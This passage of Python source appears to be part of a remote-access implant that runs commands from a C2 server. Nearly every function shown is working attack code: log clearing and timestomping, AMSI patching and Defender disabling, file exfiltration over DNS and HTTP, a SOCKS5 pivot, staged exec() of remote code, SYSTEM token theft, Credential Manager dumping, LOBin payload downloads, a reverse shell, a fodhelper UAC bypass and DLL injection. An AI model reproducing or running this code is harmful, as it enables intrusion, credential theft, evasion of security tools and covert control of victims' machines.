    if not os.path.exists(ref):
        return f"[-] Reference not found: {ref}"
    try:
        st = os.stat(ref)
        os.utime(target, (st.st_atime, st.st_mtime))
        if sys.platform == "win32":
            # Also copy creation time on Windows via ctypes
            import ctypes, ctypes.wintypes as wt
            GENERIC_WRITE = 0x40000000
            FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
            h = ctypes.windll.kernel32.CreateFileW(
                target, GENERIC_WRITE, 0, None, 3,
                FILE_FLAG_BACKUP_SEMANTICS, None
            )
            if h and h != wt.HANDLE(-1).value:
                # Convert Unix timestamp to FILETIME (100ns intervals since 1601)
                EPOCH_DIFF = 11644473600
                ft_val = int((st.st_mtime + EPOCH_DIFF) * 10_000_000)
                ft = ctypes.c_uint64(ft_val)
                ctypes.windll.kernel32.SetFileTime(h, ctypes.byref(ft), None, None)
                ctypes.windll.kernel32.CloseHandle(h)
        return f"[+] Timestamps copied from {ref} → {target}"
    except Exception as e:
        return f"[-] timestomp: {e}"


@_register("clear_logs")
def _clear_logs(conn, args: list[str]) -> str:
    target = args[0].lower() if args else "all"
    results: list[str] = []
    if target in ("windows", "all") and sys.platform == "win32":
        for log in ("System", "Application", "Security", "Setup"):
            r = _shell_exec(f'wevtutil cl {log} 2>&1')
            results.append(f"  [{log}] {r or 'cleared'}")
    if target in ("linux", "all") and sys.platform != "win32":
        for path in ("/var/log/syslog", "/var/log/auth.log", "/var/log/messages",
                     os.path.expanduser("~/.bash_history"),
                     os.path.expanduser("~/.zsh_history")):
            if os.path.isfile(path):
                try:
                    open(path, "w").close()
                    results.append(f"  [+] Cleared: {path}")
                except PermissionError:
                    results.append(f"  [-] Permission denied: {path}")
    return "\n".join(results) if results else "[-] Nothing to clear"


@_register("patch_amsi")
def _patch_amsi(conn, args: list[str]) -> str:
    if sys.platform != "win32":
        return "[-] AMSI is Windows-only"
    try:
        import ctypes
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        # Get address of AmsiScanBuffer
        addr = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
        if not addr:
            return "[-] AmsiScanBuffer not found"
        # Patch with  ret 0  (xor eax,eax ; ret) — defeats AMSI scanning
        patch = (ctypes.c_char * 6)(*b"\x31\xC0\xC3\x90\x90\x90")
        old_prot = ctypes.c_ulong(0)
        ctypes.windll.kernel32.VirtualProtect(addr, 6, 0x40, ctypes.byref(old_prot))
        ctypes.memmove(addr, patch, 6)
        ctypes.windll.kernel32.VirtualProtect(addr, 6, old_prot, ctypes.byref(old_prot))
        return "[+] AMSI patched — AmsiScanBuffer returns AMSI_RESULT_CLEAN"
    except Exception as e:
        return f"[-] patch_amsi: {e}"


@_register("disable_defender")
def _disable_defender(conn, args: list[str]) -> str:
    if sys.platform != "win32":
        return "[-] Windows Defender is Windows-only"
    results = []
    cmds = [
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" "
        "/v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" "
        "/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1",
        "powershell -NoProfile -NonInteractive -Command "
        "\"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>&1",
    ]
    for cmd in cmds:
        r = _shell_exec(cmd)
        results.append(f"  {r.strip()[:80]}")
    return "\n".join(results)


@_register("hide_file")
def _hide_file(conn, args: list[str]) -> str:
    if not args:
        return "Usage: hide_file <path>"
    path = args[0]
    if sys.platform == "win32":
        r = _shell_exec(f'attrib +h +s "{path}" 2>&1')
        return r or f"[+] Hidden: {path}"
    else:
        # Unix: just rename to .dotfile
        base = os.path.basename(path)
        if not base.startswith("."):
            new_path = os.path.join(os.path.dirname(path), "." + base)
            try:
                os.rename(path, new_path)
                return f"[+] Renamed to hidden: {new_path}"
            except Exception as e:
                return f"[-] hide_file: {e}"
        return "[*] File already hidden (starts with dot)"


# ---------------------------------------------------------------------------
# Lateral movement
# ---------------------------------------------------------------------------

@_register("ping_sweep")
def _ping_sweep(conn, args: list[str]) -> str:
    if not args:
        return "Usage: ping_sweep <cidr>"
    cidr = args[0]
    try:
        import ipaddress
        network = ipaddress.ip_network(cidr, strict=False)
    except ValueError as e:
        return f"[-] Invalid CIDR: {e}"

    up: list[str] = []
    import concurrent.futures

    def _ping(ip: str) -> str | None:
        if sys.platform == "win32":
            r = subprocess.run(["ping", "-n", "1", "-w", "500", str(ip)],
                               capture_output=True, timeout=3)
        else:
            r = subprocess.run(["ping", "-c", "1", "-W", "1", str(ip)],
                               capture_output=True, timeout=3)
        return str(ip) if r.returncode == 0 else None

    hosts = list(network.hosts())
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        for result in ex.map(_ping, hosts):
            if result:
                up.append(result)

    if not up:
        return f"[-] No hosts up in {cidr}"
    return f"[+] Hosts up ({len(up)}):\n" + "\n".join(f"  {ip}" for ip in sorted(up))


@_register("smb_shares")
def _smb_shares(conn, args: list[str]) -> str:
    if not args:
        return "Usage: smb_shares <host>"
    host = args[0]
    if sys.platform == "win32":
        return _shell_exec(f"net view \\\\{host} /all 2>&1")
    # Linux: try smbclient
    if shutil.which("smbclient"):
        return _shell_exec(f"smbclient -N -L //{host} 2>&1")
    return "[-] smbclient not found"


@_register("ssh_connect")
def _ssh_connect(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: ssh_connect <user> <host> [port]"
    user, host = args[0], args[1]
    port = int(args[2]) if len(args) > 2 and args[2].isdigit() else 22
    if not shutil.which("ssh"):
        return "[-] ssh not found on this system"
    cmd = f"ssh -o StrictHostKeyChecking=no -o BatchMode=yes -p {port} {user}@{host} id 2>&1"
    return _shell_exec(cmd)


@_register("rdp_enable")
def _rdp_enable(conn, args: list[str]) -> str:
    if sys.platform != "win32":
        return "[-] RDP enable is Windows-only"
    results = []
    cmds = [
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" "
        "/v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1",
        "netsh advfirewall firewall add rule name=\"Allow RDP\" "
        "protocol=TCP dir=in localport=3389 action=allow 2>&1",
        "net start TermService 2>&1",
    ]
    for cmd in cmds:
        results.append(_shell_exec(cmd).strip()[:80])
    return "\n".join(results)


# ---------------------------------------------------------------------------
# Exfiltration
# ---------------------------------------------------------------------------

@_register("exfil_dns")
def _exfil_dns(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: exfil_dns <file_path> <domain>"
    path, domain = args[0], args[1]
    if not os.path.isfile(path):
        return f"[-] Not found: {path}"
    try:
        import base64, socket as _sock
        with open(path, "rb") as fh:
            data = fh.read()
        encoded = base64.b32encode(data).decode().rstrip("=")
        chunk_size = 50   # safe DNS label length
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        sent = 0
        for i, chunk in enumerate(chunks):
            label = f"{i}.{chunk.lower()}.{domain}"
            try:
                _sock.getaddrinfo(label, None)
            except OSError:
                pass   # expected — server-side resolver captures the query
            sent += 1
        return f"[+] Exfiltrated via DNS: {sent} chunks × {chunk_size} chars → {domain}"
    except Exception as e:
        return f"[-] exfil_dns: {e}"


@_register("exfil_http")
def _exfil_http(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: exfil_http <file_path> <url>"
    path, url = args[0], args[1]
    if not os.path.isfile(path):
        return f"[-] Not found: {path}"
    # Try urllib first (stdlib), then curl/wget
    try:
        import urllib.request
        with open(path, "rb") as fh:
            data = fh.read()
        req = urllib.request.Request(url, data=data, method="POST")
        with urllib.request.urlopen(req, timeout=30) as resp:
            code = resp.getcode()
        return f"[+] Uploaded to {url}  (HTTP {code})"
    except Exception as e1:
        # Fallback to curl
        if shutil.which("curl"):
            r = _shell_exec(f'curl -s -X POST --data-binary @{path} "{url}" 2>&1')
            return r or f"[+] curl upload to {url}"
        return f"[-] exfil_http: {e1}"


# ---------------------------------------------------------------------------
# SOCKS5 proxy server on the agent  (first implementation — legacy, kept for
# _launch_socks5_server; the canonical @_register("socks5") is defined later)
# ---------------------------------------------------------------------------

_socks5_servers: dict[int, object] = {}   # port → server socket

# NOTE: @_register("socks5") is NOT placed here; the full RFC-1928 compliant
# implementation below (line ~2832) is the authoritative registration.
def _socks5_start_legacy(conn, args: list[str]) -> str:
    """Legacy wrapper kept for internal use; not directly registered."""
    port = int(args[0]) if args and args[0].isdigit() else 1080
    if port in _socks5_servers:
        return f"[-] SOCKS5 already running on port {port}"
    try:
        _launch_socks5_server(port)
        return f"[+] SOCKS5 proxy listening on 0.0.0.0:{port}"
    except Exception as e:
        return f"[-] socks5: {e}"


def _launch_socks5_server(port: int) -> None:
    import socket as _sock
    srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
    srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(10)
    _socks5_servers[port] = srv

    def _accept_loop():
        while port in _socks5_servers:
            try:
                client, addr = srv.accept()
            except OSError:
                break
            threading.Thread(target=_handle_socks5_client, args=(client,), daemon=True).start()

    threading.Thread(target=_accept_loop, daemon=True).start()


def _handle_socks5_client(client) -> None:
    """SOCKS5 server implementation (RFC 1928, no-auth only)."""
    import socket as _sock
    import struct as _struct
    try:
        # Greeting
        header = client.recv(2)
        if len(header) < 2:
            client.close(); return
        n_methods = header[1]
        client.recv(n_methods)
        # Accept no-auth (method 0x00)
        client.sendall(b"\x05\x00")

        # Request
        req = client.recv(4)
        if len(req) < 4 or req[0] != 5:
            client.close(); return
        cmd, _, atyp = req[1], req[2], req[3]

        if atyp == 1:    # IPv4
            raw = client.recv(4)
            dest_addr = _sock.inet_ntoa(raw)
        elif atyp == 3:  # Domain name
            length = client.recv(1)[0]
            dest_addr = client.recv(length).decode("utf-8", errors="replace")
        elif atyp == 4:  # IPv6
            raw = client.recv(16)
            dest_addr = _sock.inet_ntop(_sock.AF_INET6, raw)
        else:
            client.close(); return

        dest_port = _struct.unpack("!H", client.recv(2))[0]

        if cmd != 1:  # Only CONNECT supported
            client.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            client.close(); return

        try:
            remote = _sock.create_connection((dest_addr, dest_port), timeout=10)
        except OSError:
            client.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            client.close(); return

        # Success reply
        client.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")

        def _relay(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except OSError:
                pass
            finally:
                for s in (src, dst):
                    try: s.close()
                    except OSError: pass

        threading.Thread(target=_relay, args=(client, remote), daemon=True).start()
        threading.Thread(target=_relay, args=(remote, client), daemon=True).start()

    except Exception:
        try: client.close()
        except OSError: pass


# ---------------------------------------------------------------------------
# Staged payload receiver  (Stage 1 bootstrap)
# ---------------------------------------------------------------------------

@_register("load_stage")
def _load_stage(conn, args: list[str]) -> str:
    """
    Receive a Python code payload from the C2 channel and exec() it.
    This is the agent-side handler for the stage-1 loader.
    The payload arrives as a single message containing Python source.
    """
    try:
        code = recv_msg(conn)   # wait for stage-1 source
        exec(compile(code, "<stage1>", "exec"), {"conn": conn, "__name__": "__stage1__"})
        return "[+] Stage 1 loaded and executed"
    except Exception as e:
        return f"[-] load_stage: {e}"




# ---------------------------------------------------------------------------
# Forkbomb (kept as dangerous/novelty)
# ---------------------------------------------------------------------------

@_register("forkbomb")
def _forkbomb(conn, args: list[str]) -> str:
    if not hasattr(os, "fork"):
        return "[-] forkbomb not supported on this platform"
    try:
        os.fork()
    except OSError as e:
        return f"[-] fork failed: {e}"
    return "[+] forkbomb triggered"


# ---------------------------------------------------------------------------
# Generic shell fallback (for any raw command not handled above)
# ---------------------------------------------------------------------------

def _shell_exec(cmd: str) -> str:
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            cwd=os.getcwd(),
        )
        try:
            stdout, stderr = proc.communicate(timeout=60)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return "[-] Command timed out (60s)"
        out = (stdout + stderr).decode(errors="replace").strip()
        return out if out else "(no output)"
    except Exception as e:
        return f"[-] Command failed: {e}"


# ---------------------------------------------------------------------------
# Evasion — lock the screen while doing covert work
# ---------------------------------------------------------------------------

@_register("lock_screen")
def _lock_screen(conn, args: list[str]) -> str:
    """
    Silently lock the workstation so the operator can work without the
    user seeing what's happening on their screen.
    """
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.LockWorkStation()
            return "[+] Workstation locked"
        except Exception as e:
            return f"[-] lock_screen: {e}"
    elif sys.platform == "darwin":
        try:
            subprocess.Popen(
                ["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession",
                 "-suspend"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return "[+] Screen locked (CGSession)"
        except Exception:
            try:
                subprocess.Popen(
                    ["osascript", "-e",
                     'tell application "System Events" to keystroke "q" using {command down, control down, option down}'],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                return "[+] Screen lock shortcut sent"
            except Exception as e:
                return f"[-] lock_screen: {e}"
    else:
        for cmd in (["loginctl", "lock-session"],
                    ["gnome-screensaver-command", "--lock"],
                    ["xscreensaver-command", "-lock"],
                    ["dm-tool", "lock"]):
            if shutil.which(cmd[0]):
                try:
                    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return f"[+] Screen locked via {cmd[0]}"
                except Exception as e:
                    return f"[-] lock_screen: {e}"
        return "[-] No screen-lock tool found"


# ---------------------------------------------------------------------------
# Token / credential theft — Windows impersonation token steal
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Windows privilege pre-flight helper (shared by token ops and uac_bypass)
# ---------------------------------------------------------------------------

def _windows_privcheck() -> str | None:
    """
    Quick privilege probe for Windows token operations.
    Returns None if the caller appears to have sufficient rights,
    or a descriptive error string if they do not.
    """
    if sys.platform != "win32":
        return "[-] Windows-only operation"
    try:
        import ctypes
        import ctypes.wintypes as wt

        # Check for admin group membership
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            # Also check for SeDebugPrivilege explicitly
            TOKEN_QUERY    = 0x0008
            TOKEN_ALL_ACCESS = 0xF01FF
            advapi32 = ctypes.windll.advapi32
            kernel32 = ctypes.windll.kernel32

            h_token = wt.HANDLE()
            h_proc  = kernel32.GetCurrentProcess()
            if not advapi32.OpenProcessToken(h_proc, TOKEN_QUERY, ctypes.byref(h_token)):
                return "[-] Privilege check: OpenProcessToken failed — likely no admin rights"

            class LUID(ctypes.Structure):
                _fields_ = [("LowPart", wt.DWORD), ("HighPart", ctypes.c_long)]

            luid = LUID()
            if not advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
                ctypes.windll.kernel32.CloseHandle(h_token)
                return "[-] Privilege check: LookupPrivilegeValue failed"

            # A simple heuristic: try to open winlogon (PID 4 is SYSTEM on Win but not always)
            # We probe by attempting a no-access open on a SYSTEM process
            import subprocess as _sp
            try:
                raw = _sp.check_output(
                    ["tasklist", "/FI", "IMAGENAME eq winlogon.exe", "/FO", "CSV", "/NH"],
                    text=True, stderr=_sp.DEVNULL
                )
                rows = [r for r in raw.splitlines() if r.strip()]
                if rows:
                    parts = rows[0].strip('"').split('","')
                    test_pid = int(parts[1]) if len(parts) > 1 else 0
                    if test_pid:
                        PROCESS_QUERY_LIMITED = 0x1000
                        h = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_LIMITED, False, test_pid)
                        if not h:
                            ctypes.windll.kernel32.CloseHandle(h_token)
                            return (
                                "[-] Privilege check: Cannot open SYSTEM process — "
                                "SeDebugPrivilege not held. Run as administrator."
                            )
                        ctypes.windll.kernel32.CloseHandle(h)
            except Exception:
                pass

            ctypes.windll.kernel32.CloseHandle(h_token)
    except Exception as e:
        return f"[-] Privilege check failed: {e}"
    return None  # looks OK


@_register("token_steal")
def _token_steal(conn, args: list[str]) -> str:
    """
    Enumerate processes with SYSTEM tokens and impersonate one.
    Windows only. Requires SeDebugPrivilege (local admin or SYSTEM).
    Usage: token_steal [pid]   — if no pid, auto-picks a SYSTEM-owned process
    """
    if sys.platform != "win32":
        return "[-] token_steal is Windows-only"
    priv_err = _windows_privcheck()
    if priv_err:
        return priv_err
    try:
        import ctypes
        import ctypes.wintypes as wt

        TOKEN_DUPLICATE        = 0x0002
        TOKEN_QUERY            = 0x0008
        TOKEN_IMPERSONATE      = 0x0004
        TOKEN_ALL_ACCESS       = 0xF01FF
        PROCESS_QUERY_INFO     = 0x0400
        SecurityImpersonation  = 2
        TokenImpersonation     = 2

        advapi32 = ctypes.windll.advapi32
        kernel32 = ctypes.windll.kernel32

        target_pid: int | None = None
        if args and args[0].isdigit():
            target_pid = int(args[0])
        else:
            # Find a SYSTEM process: winlogon.exe or lsass.exe
            import subprocess as _sp
            raw = _sp.check_output(
                ["tasklist", "/FI", "USERNAME eq SYSTEM", "/FO", "CSV", "/NH"],
                text=True, stderr=_sp.DEVNULL
            )
            for row in raw.splitlines():
                parts = row.strip().strip('"').split('","')
                if len(parts) >= 2 and parts[0].lower() in ("winlogon.exe", "lsass.exe", "services.exe"):
                    target_pid = int(parts[1])
                    break
            if target_pid is None:
                return "[-] Could not find a SYSTEM process automatically — supply a PID"

        # Enable SeDebugPrivilege
        h_token   = wt.HANDLE()
        h_process = kernel32.GetCurrentProcess()
        advapi32.OpenProcessToken(h_process, TOKEN_ALL_ACCESS, ctypes.byref(h_token))

        class LUID(ctypes.Structure):
            _fields_ = [("LowPart", wt.DWORD), ("HighPart", ctypes.c_long)]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [("PrivilegeCount", wt.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]

        SE_PRIVILEGE_ENABLED = 0x02
        luid = LUID()
        advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp),
                                       ctypes.sizeof(tp), None, None)
        kernel32.CloseHandle(h_token)

        # Open target process and duplicate its token
        h_target = kernel32.OpenProcess(PROCESS_QUERY_INFO, False, target_pid)
        if not h_target:
            return f"[-] OpenProcess({target_pid}) failed — need SeDebugPrivilege"

        h_proc_token  = wt.HANDLE()
        h_duped_token = wt.HANDLE()
        advapi32.OpenProcessToken(h_target, TOKEN_DUPLICATE | TOKEN_QUERY,
                                  ctypes.byref(h_proc_token))
        advapi32.DuplicateToken(h_proc_token, SecurityImpersonation,
                                ctypes.byref(h_duped_token))
        kernel32.CloseHandle(h_proc_token)
        kernel32.CloseHandle(h_target)

        # Impersonate
        result = advapi32.ImpersonateLoggedOnUser(h_duped_token)
        kernel32.CloseHandle(h_duped_token)

        if result:
            return f"[+] Token stolen from PID {target_pid} — now impersonating SYSTEM"
        return "[-] ImpersonateLoggedOnUser failed"
    except Exception as e:
        return f"[-] token_steal: {e}"


# ---------------------------------------------------------------------------
# Credential vault — Windows Credential Manager dump
# ---------------------------------------------------------------------------

@_register("cred_vault")
def _cred_vault(conn, args: list[str]) -> str:
    """
    Enumerate and dump credentials stored in the Windows Credential Manager
    (generic passwords, RDP saved credentials, etc.) using ctypes.
    No external tools required.
    """
    if sys.platform != "win32":
        return "[-] cred_vault is Windows-only (use wifi_passwords + hashdump on other platforms)"
    try:
        import ctypes
        import ctypes.wintypes as wt

        CRED_TYPE_GENERIC           = 1
        CRED_TYPE_DOMAIN_PASSWORD   = 2
        CRED_TYPE_DOMAIN_CERTIFICATE = 3
        CRED_ENUMERATE_ALL_CREDENTIALS = 0x1
        CRED_TYPES = {1: "Generic", 2: "Domain", 3: "Certificate", 4: "DomainVisible", 5: "Generic+Cert"}

        class CREDENTIAL_ATTRIBUTE(ctypes.Structure):
            _fields_ = [("Keyword", wt.LPWSTR), ("Flags", wt.DWORD),
                        ("ValueSize", wt.DWORD), ("Value", ctypes.POINTER(wt.BYTE))]

        class CREDENTIAL(ctypes.Structure):
            _fields_ = [
                ("Flags",              wt.DWORD),
                ("Type",               wt.DWORD),
                ("TargetName",         wt.LPWSTR),
                ("Comment",            wt.LPWSTR),
                ("LastWritten",        wt.FILETIME),
                ("CredentialBlobSize", wt.DWORD),
                ("CredentialBlob",     ctypes.POINTER(wt.BYTE)),
                ("Persist",            wt.DWORD),
                ("AttributeCount",     wt.DWORD),
                ("Attributes",         ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),
                ("TargetAlias",        wt.LPWSTR),
                ("UserName",           wt.LPWSTR),
            ]

        advapi32 = ctypes.windll.advapi32
        count    = wt.DWORD(0)
        creds_ptr = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()

        if not advapi32.CredEnumerateW(None, CRED_ENUMERATE_ALL_CREDENTIALS,
                                        ctypes.byref(count), ctypes.byref(creds_ptr)):
            return "[-] CredEnumerateW failed — no credentials or insufficient rights"

        lines = [f"  Found {count.value} credential(s)\n"]
        for i in range(count.value):
            c = creds_ptr[i].contents
            kind   = CRED_TYPES.get(c.Type, str(c.Type))
            target = c.TargetName or "(none)"
            user   = c.UserName   or "(none)"
            secret = "(none)"
            if c.CredentialBlobSize and c.CredentialBlob:
                raw = bytes(c.CredentialBlob[j] for j in range(c.CredentialBlobSize))
                try:
                    secret = raw.decode("utf-16-le").rstrip("\x00")
                except Exception:
                    secret = raw.hex()
            lines.append(f"  [{kind}]")
            lines.append(f"    Target  : {target}")
            lines.append(f"    Username: {user}")
            lines.append(f"    Secret  : {secret}")
            lines.append("")

        advapi32.CredFree(creds_ptr)
        return "\n".join(lines)
    except Exception as e:
        return f"[-] cred_vault: {e}"


# ---------------------------------------------------------------------------
# Living-off-the-land — execute a signed Windows binary to run arbitrary code
# ---------------------------------------------------------------------------

@_register("living_off_land")
def _living_off_land(conn, args: list[str]) -> str:
    """
    Execute code via signed Windows LOLBins to blend in with normal activity.
    Usage: living_off_land <lolbin> <payload>
    Supported lolbins: mshta, regsvr32, certutil, wmic, rundll32, cscript
    Example: living_off_land mshta http://10.0.0.1/payload.hta
             living_off_land certutil -urlcache -f http://10.0.0.1/nc.exe nc.exe
    """
    if sys.platform != "win32":
        return "[-] living_off_land is Windows-only"
    if not args:
        return "Usage: living_off_land <lolbin> <args...>"

    lolbin = args[0].lower()
    rest   = " ".join(args[1:])

    LOLBINS = {
        "mshta":     "mshta.exe",
        "regsvr32":  "regsvr32.exe",
        "certutil":  "certutil.exe",
        "wmic":      "wmic.exe",
        "rundll32":  "rundll32.exe",
        "cscript":   "cscript.exe",
        "wscript":   "wscript.exe",
        "msiexec":   "msiexec.exe",
        "installutil": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
    }
    if lolbin not in LOLBINS:
        return f"[-] Unknown lolbin '{lolbin}'. Supported: {', '.join(LOLBINS)}"

    binary = LOLBINS[lolbin]
    full_cmd = f'"{binary}" {rest}'
    try:
        proc = subprocess.Popen(full_cmd, shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.DEVNULL)
        try:
            out, err = proc.communicate(timeout=30)
            result = (out + err).decode(errors="replace").strip()
            return f"[+] {lolbin} launched (exit {proc.returncode})\n{result}" if result else \
                   f"[+] {lolbin} launched (exit {proc.returncode})"
        except subprocess.TimeoutExpired:
            # Detach — the process keeps running
            return f"[+] {lolbin} launched and detached (no stdout timeout)"
    except Exception as e:
        return f"[-] living_off_land: {e}"


# ---------------------------------------------------------------------------
# Reverse shell — connect back to operator with interactive PTY
# ---------------------------------------------------------------------------

@_register("reverse_shell")
def _reverse_shell(conn, args: list[str]) -> str:
    """
    Open a raw reverse TCP shell back to operator_host:port, separate from
    the C2 channel. Uses /bin/bash PTY on Unix, cmd.exe pipe on Windows.
    Usage: reverse_shell <operator_ip> <port>
    The connection runs in a background daemon thread.
    """
    if len(args) != 2:
        return "Usage: reverse_shell <operator_ip> <port>"
    try:
        host = args[0]
        port = int(args[1])
    except ValueError:
        return "[-] Invalid port"

    def _run():
        import socket as _sock
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.connect((host, port))
            if sys.platform == "win32":
                proc = subprocess.Popen(
                    ["cmd.exe"],
                    stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(),
                    shell=False
                )
            else:
                import pty
                master, slave = pty.openpty()
                proc = subprocess.Popen(
                    ["/bin/bash", "-i"],
                    stdin=slave, stdout=slave, stderr=slave,
                    preexec_fn=os.setsid, close_fds=True
                )
                os.close(slave)

                def _relay_pty():
                    import select
                    while True:
                        r, _, _ = select.select([master, s.fileno()], [], [], 0.5)
                        if master in r:
                            try:
                                data = os.read(master, 4096)
                                s.sendall(data)
                            except OSError:
                                break
                        if s.fileno() in r:
                            try:
                                data = s.recv(4096)
                                if not data:
                                    break
                                os.write(master, data)
                            except OSError:
                                break

                threading.Thread(target=_relay_pty, daemon=True).start()
            proc.wait()
            s.close()
        except Exception:
            pass

    threading.Thread(target=_run, daemon=True).start()
    return f"[+] Reverse shell thread started → {host}:{port} (listen with: nc -lvnp {port})"


# ---------------------------------------------------------------------------
# UAC bypass — Windows auto-elevation via fodhelper.exe
# ---------------------------------------------------------------------------

@_register("uac_bypass")
def _uac_bypass(conn, args: list[str]) -> str:
    """
    Bypass UAC on Windows 10/11 using the fodhelper registry hijack.
    Writes a payload command into HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command
    and triggers it via fodhelper.exe — no prompts, no DLL drops.
    Usage: uac_bypass <command>
    Example: uac_bypass cmd.exe /c net localgroup administrators victim /add
    """
    if sys.platform != "win32":
        return "[-] uac_bypass is Windows-only"
    if not args:
        return "Usage: uac_bypass <command>"
    priv_err = _windows_privcheck()
    if priv_err:
        return priv_err
    payload = " ".join(args)
    try:
        import winreg
        KEY = r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, KEY) as k:
            winreg.SetValueEx(k, None,           0, winreg.REG_SZ, payload)
            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")

        subprocess.Popen(
            ["C:\\Windows\\System32\\fodhelper.exe"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(2)

        # Clean up the registry key
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY,
                            access=winreg.KEY_SET_VALUE | winreg.KEY_READ) as k:
            try:
                winreg.DeleteValue(k, None)
                winreg.DeleteValue(k, "DelegateExecute")
            except FileNotFoundError:
                pass
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings\shell\open\command")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings\shell\open")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings\shell")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings")
        except Exception:
            pass

        return f"[+] UAC bypass triggered via fodhelper → payload: {payload}"
    except Exception as e:
        return f"[-] uac_bypass: {e}"


# ---------------------------------------------------------------------------
# DLL injection — write a DLL to disk and inject via LoadLibrary remote thread
# ---------------------------------------------------------------------------

@_register("dll_inject")
def _dll_inject(conn, args: list[str]) -> str:
    """
    Inject a DLL (already on disk) into a running Windows process.
    Uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread(LoadLibraryA).
    Usage: dll_inject <pid> <path_to_dll_on_target>
    """
    if sys.platform != "win32":
        return "[-] dll_inject is Windows-only"
    if len(args) != 2 or not args[0].isdigit():
        return "Usage: dll_inject <pid> <dll_path>"
    pid      = int(args[0])
    dll_path = args[1]
    if not os.path.isfile(dll_path):
        return f"[-] DLL not found: {dll_path}"
    try:
        import ctypes

        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT         = 0x1000
        MEM_RESERVE        = 0x2000
        PAGE_READWRITE     = 0x04

        kernel32  = ctypes.windll.kernel32
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return f"[-] OpenProcess({pid}) failed"

        dll_bytes = dll_path.encode("ascii") + b"\x00"
        alloc = kernel32.VirtualAllocEx(
            h_process, None, len(dll_bytes),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        if not alloc:
            kernel32.CloseHandle(h_process)
            return "[-] VirtualAllocEx failed"

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, alloc, dll_bytes,
                                    len(dll_bytes), ctypes.byref(written))

        load_lib = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA"
        )
        from ctypes import wintypes
        tid = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(
            h_process, None, 0, load_lib, alloc, 0, ctypes.byref(tid)
        )
        if not h_thread:
            kernel32.CloseHandle(h_process)
            return "[-] CreateRemoteThread failed"

        kernel32.WaitForSingleObject(h_thread, 5000)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
